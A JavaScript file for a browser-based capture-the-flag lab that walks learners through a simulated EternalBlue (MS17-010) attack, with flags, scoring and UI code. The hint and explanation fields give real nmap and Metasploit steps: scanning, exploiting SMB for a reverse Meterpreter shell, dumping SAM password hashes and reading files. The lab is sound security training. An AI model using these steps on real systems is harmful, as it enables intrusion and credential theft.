'use strict';

// ── EternalBlue challenges ────────────────────────────────────────────────────
const ETERNALBLUE_CHALLENGES = [
  {
    id: 1, title: 'Discover the Target', pts: 100,
    flag: 'FLAG{win7_host_discovered_10_10_20_10}',
    hint: 'sudo nmap -sn 10.10.20.0/24',
    explain: 'Every attack starts with reconnaissance — figuring out what\'s on the network before you try anything.\n\nA "ping sweep" sends a small packet to every possible address in a network range and listens for replies. Any machine that replies is alive and worth investigating. The -sn flag tells nmap to only do this discovery step and not scan ports yet.\n\nThe range 10.10.20.0/24 means "check all 256 addresses from 10.10.20.0 to 10.10.20.255." We find a Windows 7 machine at 10.10.20.10.\n\nWindows 7 reached end-of-life in January 2020, meaning Microsoft stopped releasing security patches for it. Any vulnerability discovered after that date will never be fixed. Machines like this are extremely common in real corporate networks — they\'re expensive to upgrade and often running critical software that can\'t be moved.',
    done: false,
    check: r => r.id === 'nmap-eb-discovery',
  },
  {
    id: 2, title: 'Identify Vulnerability', pts: 150,
    flag: 'FLAG{ms17_010_eternalblue_confirmed}',
    hint: 'sudo nmap -sV --script smb-vuln-ms17-010 10.10.20.10',
    explain: 'MS17-010 is one of the most famous vulnerabilities in history. Here\'s the story:\n\nThe NSA discovered a critical flaw in Windows\'s file-sharing protocol (SMB) and secretly developed an exploit for it called EternalBlue. They used it for years for intelligence gathering. In 2017, a hacker group called Shadow Brokers stole and published the NSA\'s hacking tools online — including EternalBlue.\n\nWithin weeks, criminal groups weaponised it. The WannaCry ransomware used EternalBlue to infect 230,000 computers in 150 countries in a single day, including the UK\'s National Health Service. The NotPetya attack caused $10 billion in damage worldwide.\n\nThe vulnerability allows an attacker to run any code they want on a target machine with no username, no password, and no interaction from the victim. The nmap script checks if the target is unpatched. A VULNERABLE result means we can get in.',
    done: false,
    check: r => r.id === 'nmap-eb-vuln',
  },
  {
    id: 3, title: 'Launch Metasploit', pts: 100,
    flag: 'FLAG{msfconsole_ready}',
    hint: 'msfconsole',
    explain: 'Metasploit is the most widely used hacking framework in the world — used by both professional penetration testers and real attackers. It\'s a collection of pre-written exploit code, payloads, and tools all wrapped in an easy-to-use interface.\n\nThink of it like a toolbox where someone else has already done the hard work of writing the exploit. You just pick the right tool, point it at a target, and pull the trigger.\n\nmsfconsole is the interactive command-line interface for Metasploit. When it loads you\'ll see the msf6 > prompt. From here you can search for exploits, load modules, configure options, and run attacks.\n\nMetasploit is free, open source, and comes pre-installed on Kali Linux.',
    done: false,
    check: r => r.id === 'msfconsole',
  },
  {
    id: 4, title: 'Load EternalBlue Module', pts: 150,
    flag: 'FLAG{eternalblue_module_loaded}',
    hint: 'use exploit/windows/smb/ms17_010_eternalblue',
    explain: 'Metasploit organises its tools into "modules" sorted by category. The path exploit/windows/smb/ms17_010_eternalblue tells you exactly what it is: an exploit, targeting Windows, via SMB, specifically the MS17-010 vulnerability.\n\nThe "use" command loads that module and makes it active. You\'ll see the prompt change to include the module name — that\'s confirmation it\'s loaded.\n\nYou can type "show options" at any point to see what settings the module needs before it can run. You can also type "info" to read a full description of the exploit including its history and technical details.',
    done: false,
    check: r => r.id === 'msf-use',
  },
  {
    id: 5, title: 'Configure the Exploit', pts: 150,
    flag: 'FLAG{rhosts_lhost_configured}',
    hint: 'set RHOSTS 10.10.20.10\nset LHOST 10.10.20.5',
    explain: 'Before running any exploit you need to tell it where to go and where to come back to.\n\nRHOSTS is the target — the machine you\'re attacking. "R" stands for Remote.\n\nLHOST is your own machine\'s IP address — where the shell will connect back to. "L" stands for Local.\n\nWhy does the shell connect back to us instead of us connecting to it? Because most firewalls block incoming connections but allow outgoing ones. A "reverse shell" has the victim machine reach out to the attacker, which looks like normal outbound traffic and slips past the firewall.\n\nAfter setting these, type "show options" to confirm everything looks right before running.',
    done: false,
    check: r => r.id === 'msf-set',
  },
  {
    id: 6, title: 'Run the Exploit', pts: 400,
    flag: 'FLAG{meterpreter_session_opened}',
    hint: 'run',
    explain: 'This is the moment everything comes together. Type "run" and watch.\n\nEternalBlue works by sending a specially crafted packet to the Windows SMB service. The packet triggers a buffer overflow — it writes data into a part of memory it shouldn\'t be able to reach, and that data happens to be code that we control. The Windows kernel executes our code before any authentication check happens.\n\nOur payload is called Meterpreter. It\'s an advanced shell that runs entirely in RAM — it never writes any files to disk. This makes it nearly invisible to antivirus software, which mostly looks for malicious files.\n\nIf the exploit succeeds you\'ll see "Meterpreter session 1 opened" and the prompt changes to meterpreter >. You\'re in.',
    done: false,
    check: r => r.id === 'msf-run',
  },
  {
    id: 7, title: 'Verify Access', pts: 200,
    flag: 'FLAG{nt_authority_system_eternalblue}',
    hint: 'getuid\nsysinfo',
    explain: 'First thing after getting a shell: figure out who you are and what you\'re on.\n\ngetuid asks "what account am I running as?" The answer — NT AUTHORITY\\SYSTEM — is the best possible result. SYSTEM is the highest privilege level on Windows, above even Administrator. It has unrestricted access to everything on the machine.\n\nThis is why EternalBlue is so dangerous: it exploits a kernel-level bug, so the code runs in the kernel\'s security context — SYSTEM — automatically. No privilege escalation needed. You go from zero access to full control in one step.\n\nsysinfo shows the machine details: OS version, hostname, architecture. This confirms we\'re on the right target and tells us what tools and techniques will work next.',
    done: false,
    check: r => r.id === 'msf-getuid',
  },
  {
    id: 8, title: 'Dump Password Hashes', pts: 300,
    flag: 'FLAG{sam_hashes_dumped}',
    hint: 'hashdump',
    explain: 'Every Windows machine stores local account passwords in a database called the SAM (Security Account Manager). The passwords aren\'t stored in plain text — they\'re stored as NT hashes, a scrambled version of the password.\n\nNormally the SAM is locked and encrypted while Windows is running. But because we\'re running as SYSTEM, we can read it directly.\n\nhashdump extracts all the local account hashes. You\'ll see the Administrator account and its hash. These hashes can be:\n\n1. Cracked offline using john or hashcat to recover the real password\n2. Used directly in Pass-the-Hash attacks against other machines on the network without cracking them at all\n\nIn a corporate network, local Administrator accounts often share the same password across hundreds of machines. One hash can unlock them all.',
    done: false,
    check: r => r.id === 'msf-hashdump',
  },
  {
    id: 9, title: 'Pillage the Filesystem', pts: 250,
    flag: 'FLAG{secret_docs_exfiltrated}',
    hint: 'shell\ntype C:\\Users\\Administrator\\Desktop\\secret.txt',
    explain: 'Meterpreter is powerful but sometimes you just need a plain Windows command prompt. The "shell" command drops you into cmd.exe running as SYSTEM on the target machine.\n\nFrom here you can navigate the filesystem exactly like you\'re sitting at the keyboard. The Administrator\'s Desktop is always worth checking — people leave sensitive files there constantly. Passwords, internal documents, configuration files, notes with credentials.\n\nThis step simulates the data exfiltration phase of a real attack — finding and stealing the valuable data that justifies the whole operation. In real incidents, attackers often spend weeks quietly exploring a network after getting initial access, mapping out what\'s there before taking anything.\n\nType "exit" when done to return to the Meterpreter prompt.',
    done: false,
    check: r => r.id === 'msf-shell-loot',
  },
];

const CTF = {
  _lab: 'eternalblue',
  _labs: {
    eternalblue: ETERNALBLUE_CHALLENGES,
  },

  get challenges() { return this._labs[this._lab]; },

  _loadState() {
    try {
      const s = JSON.parse(localStorage.getItem('ctf_state_' + this._lab) || '{}');
      this.challenges.forEach(c => { if (s[c.id]) c.done = true; });
    } catch {}
  },

  _saveState() {
    const s = {};
    this.challenges.forEach(c => { if (c.done) s[c.id] = true; });
    localStorage.setItem('ctf_state_' + this._lab, JSON.stringify(s));
  },

  score()    { return this.challenges.filter(c => c.done).reduce((a, c) => a + c.pts, 0); },
  maxScore() { return this.challenges.reduce((a, c) => a + c.pts, 0); },
  doneCount(){ return this.challenges.filter(c => c.done).length; },

  switchLab(labId) {
    if (!this._labs[labId]) return;
    this._lab = labId;
    // Reset SIM state for the new lab
    SIM.windowsShell = false;
    SIM.lootExfiltrated = false;
    SIM.msfActive = false;
    SIM.msfModule = null;
    SIM.msfOptions = {};
    SIM.meterpreter = false;
    SIM.ebTarget = '10.10.20.10';
    SIM.user = 'kali';
    SIM.cwd  = '/home/kali';
    TERM_INSTANCES.forEach(t => t._updatePrompt());
    this._loadState();
    this._renderSidebar();
  },

  check(result) {
    if (!result || !result.id) return null;
    for (const c of this.challenges) {
      if (!c.done && c.check(result)) {
        c.done = true;
        this._saveState();
        return c;
      }
    }
    return null;
  },

  reset() {
    this.challenges.forEach(c => c.done = false);
    localStorage.removeItem('ctf_state_' + this._lab);
    SIM.windowsShell = false;
    SIM.lootExfiltrated = false;
    SIM.msfActive = false;
    SIM.msfModule = null;
    SIM.msfOptions = {};
    SIM.meterpreter = false;
    SIM.user = 'kali';
    SIM.cwd  = '/home/kali';
    TERM_INSTANCES.forEach(t => t._updatePrompt());
    this._renderSidebar();
  },

  // ── Sidebar UI ─────────────────────────────────────────────────────────────
  _renderSidebar() {
    const list    = document.getElementById('ctf-list');
    const scoreEl = document.getElementById('ctf-score');
    const barEl   = document.getElementById('ctf-bar');
    const progEl  = document.getElementById('ctf-progress-label');
    const maxEl   = document.getElementById('ctf-max');
    if (!list) return;

    scoreEl.textContent = this.score().toLocaleString();
    if (maxEl) maxEl.textContent = ' / ' + this.maxScore().toLocaleString() + ' pts';
    const pct = Math.round(this.score() / this.maxScore() * 100);
    barEl.style.width = pct + '%';
    progEl.textContent = `${this.doneCount()} / ${this.challenges.length} completed`;

    list.innerHTML = this.challenges.map(c => `
      <div class="ctf-item${c.done ? ' done' : ''}" data-cid="${c.id}" style="cursor:pointer">
        <div class="ctf-item-header">
          <div class="ctf-num">${c.done ? '✓' : c.id}</div>
          <div class="ctf-title">${c.title}</div>
          <div class="ctf-pts">${c.pts}pts</div>
          <i class="fa fa-circle-info ctf-info-btn" title="What is this?"></i>
        </div>
        ${c.done
          ? `<div class="ctf-flag">${c.flag}</div>`
          : `<div class="ctf-hint-row"><span class="ctf-hint">${c.hint.split('\n')[0]}</span><button class="ctf-copy-btn" data-cmd="${c.hint.replace(/"/g,'&quot;')}" title="Copy command"><i class="fa fa-copy"></i></button></div>`}
      </div>`
    ).join('');

    list.querySelectorAll('.ctf-item').forEach(el => {
      el.addEventListener('click', e => {
        if (e.target.closest('.ctf-copy-btn')) return;
        const cid = parseInt(el.dataset.cid);
        const ch  = this.challenges.find(c => c.id === cid);
        if (ch) this._showExplain(ch);
      });
    });

    list.querySelectorAll('.ctf-copy-btn').forEach(btn => {
      btn.addEventListener('click', e => {
        e.stopPropagation();
        const cmd = btn.dataset.cmd.split('\n')[0];
        CTF._pasteToTerminal(cmd);
        btn.innerHTML = '<i class="fa fa-check"></i>';
        setTimeout(() => { btn.innerHTML = '<i class="fa fa-copy"></i>'; }, 1500);
      });
    });
  },

  _pasteToTerminal(cmd) {
    const inst = TERM_INSTANCES.find(t => !t._busy && !t._nano) || TERM_INSTANCES[TERM_INSTANCES.length - 1];
    if (!inst) return;
    inst._setInput(cmd);
    inst.focus();
  },

  _showExplain(ch) {
    document.getElementById('ctf-explain-num').textContent   = ch.id;
    document.getElementById('ctf-explain-title').textContent = ch.title;
    document.getElementById('ctf-explain-text').textContent  = ch.explain;
    document.getElementById('ctf-explain-hint').textContent  = ch.hint;
    const copyBtn = document.getElementById('ctf-explain-copy');
    copyBtn.onclick = () => {
      CTF._pasteToTerminal(ch.hint.split('\n')[0]);
      copyBtn.innerHTML = '<i class="fa fa-check"></i> Pasted';
      setTimeout(() => { copyBtn.innerHTML = '<i class="fa fa-copy"></i> Copy'; }, 1500);
    };
    document.getElementById('ctf-explain-modal').classList.remove('hidden');
  },

  showFlagPopup(challenge) {
    document.getElementById('fp-challenge').textContent = challenge.title;
    document.getElementById('fp-flag').textContent = challenge.flag;
    document.getElementById('fp-pts').textContent = `+${challenge.pts} points`;
    document.getElementById('flag-popup').classList.remove('hidden');
    clearTimeout(this._popupTimer);
    this._popupTimer = setTimeout(() => {
      document.getElementById('flag-popup').classList.add('hidden');
    }, 9000);
  },

  init() {
    // Always start fresh — reset progress on every new session
    this.challenges.forEach(c => c.done = false);
    localStorage.removeItem('ctf_state_eternalblue');
    this._renderSidebar();

    document.getElementById('ctf-lab-select').addEventListener('change', e => {
      this.switchLab(e.target.value);
    });

    document.getElementById('ctf-reset-btn').addEventListener('click', () => {
      if (confirm('Reset all CTF progress?')) this.reset();
    });

    const closeExplain = () => document.getElementById('ctf-explain-modal').classList.add('hidden');
    document.getElementById('ctf-explain-close').addEventListener('click', closeExplain);
    document.getElementById('ctf-explain-ok').addEventListener('click', closeExplain);
    document.getElementById('ctf-explain-modal').addEventListener('click', e => {
      if (e.target === document.getElementById('ctf-explain-modal')) closeExplain();
    });

    document.getElementById('ctf-close-btn')?.addEventListener('click', () => {
      document.getElementById('ctf-sidebar').classList.add('collapsed');
    });
  },
};
